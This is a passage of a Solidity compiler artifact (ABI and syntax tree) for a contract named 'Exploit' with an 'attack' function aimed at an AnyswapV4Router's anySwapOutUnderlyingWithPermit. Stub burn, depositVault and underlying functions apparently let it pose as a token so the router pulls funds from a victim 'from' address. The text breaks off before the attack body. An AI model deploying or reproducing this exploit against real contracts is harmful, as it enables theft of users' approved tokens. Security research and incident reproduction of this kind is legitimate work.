{
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "contract AnyswapV4Router",
          "name": "anyswapV4Router",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "contract IERC20",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burn",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        }
      ],
      "name": "depositVault",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "setUnderlying",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "underlying",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "allSourcePaths": {
    "0": "contracts/Exploit.sol"
  },
  "ast": {
    "absolutePath": "contracts/Exploit.sol",
    "exportedSymbols": {
      "AnyswapV4Router": [
        45
      ],
      "Exploit": [
        176
      ],
      "IERC20": [
        23
      ]
    },
    "id": 177,
    "license": "Unlicense",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "37:23:0"
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 23,
        "linearizedBaseContracts": [
          23
        ],
        "name": "IERC20",
        "nameLocation": "71:6:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "70a08231",
            "id": 8,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "balanceOf",
            "nameLocation": "93:9:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 4,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 3,
                  "mutability": "mutable",
                  "name": "account",
                  "nameLocation": "111:7:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 8,
                  "src": "103:15:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 2,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "103:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "102:17:0"
            },
            "returnParameters": {
              "id": 7,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 6,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 8,
                  "src": "143:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 5,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "143:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "142:9:0"
            },
            "scope": 23,
            "src": "84:68:0",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "a9059cbb",
            "id": 17,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "transfer",
            "nameLocation": "166:8:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 13,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 10,
                  "mutability": "mutable",
                  "name": "recipient",
                  "nameLocation": "183:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 17,
                  "src": "175:17:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 9,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "175:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 12,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "202:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 17,
                  "src": "194:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 11,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "194:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "174:35:0"
            },
            "returnParameters": {
              "id": 16,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 15,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 17,
                  "src": "228:4:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 14,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "228:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "227:6:0"
            },
            "scope": 23,
            "src": "157:77:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "313ce567",
            "id": 22,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "decimals",
            "nameLocation": "248:8:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "256:2:0"
            },
            "returnParameters": {
              "id": 21,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 20,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 22,
                  "src": "282:5:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint8",
                    "typeString": "uint8"
                  },
                  "typeName": {
                    "id": 19,
                    "name": "uint8",
                    "nodeType": "ElementaryTypeName",
                    "src": "282:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "281:7:0"
            },
            "scope": 23,
            "src": "239:50:0",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 177,
        "src": "61:230:0",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 45,
        "linearizedBaseContracts": [
          45
        ],
        "name": "AnyswapV4Router",
        "nameLocation": "302:15:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "8d7d3eea",
            "id": 44,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "anySwapOutUnderlyingWithPermit",
            "nameLocation": "333:30:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 42,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 25,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "374:4:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "366:12:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 24,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "366:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 27,
                  "mutability": "mutable",
                  "name": "token",
                  "nameLocation": "388:5:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "380:13:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 26,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "380:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 29,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "403:2:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "395:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 28,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "395:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 31,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "415:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "407:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 30,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "407:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 33,
                  "mutability": "mutable",
                  "name": "deadline",
                  "nameLocation": "431:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "423:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 32,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "423:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 35,
                  "mutability": "mutable",
                  "name": "v",
                  "nameLocation": "447:1:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "441:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint8",
                    "typeString": "uint8"
                  },
                  "typeName": {
                    "id": 34,
                    "name": "uint8",
                    "nodeType": "ElementaryTypeName",
                    "src": "441:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 37,
                  "mutability": "mutable",
                  "name": "r",
                  "nameLocation": "458:1:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "450:9:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes32",
                    "typeString": "bytes32"
                  },
                  "typeName": {
                    "id": 36,
                    "name": "bytes32",
                    "nodeType": "ElementaryTypeName",
                    "src": "450:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 39,
                  "mutability": "mutable",
                  "name": "s",
                  "nameLocation": "469:1:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "461:9:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes32",
                    "typeString": "bytes32"
                  },
                  "typeName": {
                    "id": 38,
                    "name": "bytes32",
                    "nodeType": "ElementaryTypeName",
                    "src": "461:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 41,
                  "mutability": "mutable",
                  "name": "toChainID",
                  "nameLocation": "480:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 44,
                  "src": "472:17:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 40,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "472:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "364:127:0"
            },
            "returnParameters": {
              "id": 43,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "500:0:0"
            },
            "scope": 45,
            "src": "324:177:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 177,
        "src": "292:211:0",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 176,
        "linearizedBaseContracts": [
          176
        ],
        "name": "Exploit",
        "nameLocation": "514:7:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 47,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "544:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 176,
            "src": "528:21:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 46,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "528:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 50,
            "mutability": "mutable",
            "name": "token",
            "nameLocation": "570:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 176,
            "src": "555:20:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$23",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 49,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 48,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 23,
                "src": "555:6:0"
              },
              "referencedDeclaration": 23,
              "src": "555:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$23",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 58,
              "nodeType": "Block",
              "src": "596:35:0",
              "statements": [
                {
                  "expression": {
                    "id": 56,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 53,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 47,
                      "src": "606:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 54,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "614:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 55,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "614:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "606:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 57,
                  "nodeType": "ExpressionStatement",
                  "src": "606:18:0"
                }
              ]
            },
            "id": 59,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 51,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "593:2:0"
            },
            "returnParameters": {
              "id": 52,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "596:0:0"
            },
            "scope": 176,
            "src": "582:49:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 69,
              "nodeType": "Block",
              "src": "689:38:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 66,
                        "name": "token",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 50,
                        "src": "714:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$23",
                          "typeString": "contract IERC20"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_IERC20_$23",
                          "typeString": "contract IERC20"
                        }
                      ],
                      "id": 65,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "706:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_$",
                        "typeString": "type(address)"
                      },
                      "typeName": {
                        "id": 64,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "706:7:0",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 67,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "706:14:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "functionReturnParameters": 63,
                  "id": 68,
                  "nodeType": "Return",
                  "src": "699:21:0"
                }
              ]
            },
            "functionSelector": "6f307dc3",
            "id": 70,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "underlying",
            "nameLocation": "646:10:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 60,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "656:2:0"
            },
            "returnParameters": {
              "id": 63,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 62,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 70,
                  "src": "680:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 61,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "680:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "679:9:0"
            },
            "scope": 176,
            "src": "637:90:0",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 81,
              "nodeType": "Block",
              "src": "799:28:0",
              "statements": [
                {
                  "expression": {
                    "hexValue": "74727565",
                    "id": 79,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "bool",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "816:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "value": "true"
                  },
                  "functionReturnParameters": 78,
                  "id": 80,
                  "nodeType": "Return",
                  "src": "809:11:0"
                }
              ]
            },
            "functionSelector": "9dc29fac",
            "id": 82,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "burn",
            "nameLocation": "741:4:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 75,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 72,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "754:4:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 82,
                  "src": "746:12:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 71,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "746:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 74,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "768:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 82,
                  "src": "760:14:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 73,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "760:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "745:30:0"
            },
            "returnParameters": {
              "id": 78,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 77,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 82,
                  "src": "794:4:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 76,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "794:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "793:6:0"
            },
            "scope": 176,
            "src": "732:95:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 93,
              "nodeType": "Block",
              "src": "902:25:0",
              "statements": [
                {
                  "expression": {
                    "hexValue": "31",
                    "id": 91,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "919:1:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_rational_1_by_1",
                      "typeString": "int_const 1"
                    },
                    "value": "1"
                  },
                  "functionReturnParameters": 90,
                  "id": 92,
                  "nodeType": "Return",
                  "src": "912:8:0"
                }
              ]
            },
            "functionSelector": "bebbf4d0",
            "id": 94,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "depositVault",
            "nameLocation": "841:12:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 87,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 84,
                  "mutability": "mutable",
                  "name": "amount",
                  "nameLocation": "859:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 94,
                  "src": "854:11:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 83,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "854:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 86,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "875:2:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 94,
                  "src": "867:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 85,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "867:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "853:25:0"
            },
            "returnParameters": {
              "id": 90,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 89,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 94,
                  "src": "897:4:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 88,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "897:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "896:6:0"
            },
            "scope": 176,
            "src": "832:95:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 111,
              "nodeType": "Block",
              "src": "978:67:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 104,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 101,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "996:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 102,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "996:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 103,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 47,
                          "src": "1008:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "996:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 100,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "988:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 105,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "988:26:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 106,
                  "nodeType": "ExpressionStatement",
                  "src": "988:26:0"
                },
                {
                  "expression": {
                    "id": 109,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 107,
                      "name": "token",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 50,
                      "src": "1024:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$23",
                        "typeString": "contract IERC20"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 108,
                      "name": "_token",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 97,
                      "src": "1032:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$23",
                        "typeString": "contract IERC20"
                      }
                    },
                    "src": "1024:14:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$23",
                      "typeString": "contract IERC20"
                    }
                  },
                  "id": 110,
                  "nodeType": "ExpressionStatement",
                  "src": "1024:14:0"
                }
              ]
            },
            "functionSelector": "bdb2321f",
            "id": 112,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "setUnderlying",
